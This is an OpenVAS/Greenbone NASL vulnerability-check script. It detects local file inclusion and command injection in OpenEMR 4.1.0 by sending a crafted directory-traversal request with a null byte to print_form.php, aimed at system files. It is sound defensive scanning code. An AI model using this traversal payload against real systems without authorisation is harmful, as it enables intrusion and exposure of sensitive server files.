# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:open-emr:openemr";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103410");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2012-0991", "CVE-2012-0992");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-02-02 12:55:39 +0100 (Thu, 02 Feb 2012)");
  script_name("OpenEMR 4.1.0 LFI and Command Injection Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_openemr_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("openemr/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51788");
  script_xref(name:"URL", value:"http://www.open-emr.org/wiki/index.php/OpenEMR_Patches");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521448");

  script_tag(name:"summary", value:"OpenEMR is prone to local file include (LFI) and command
  injection vulnerabilities because it fails to properly sanitize user supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"A remote attacker can exploit these issues to execute arbitrary
  shell commands with the privileges of the user running the application, obtain potentially
  sensitive information, and execute arbitrary local scripts in the context of the Web server
  process. This could allow the attacker to compromise the application and the computer. Other
  attacks are also possible.");

  script_tag(name:"affected", value:"OpenEMR 4.1.0 is known to be vulnerable. Other versions may
  also be affected.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/contrib/acog/print_form.php?formname=", crap(data:"../", length:6 * 9), files[file], "%00");
  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
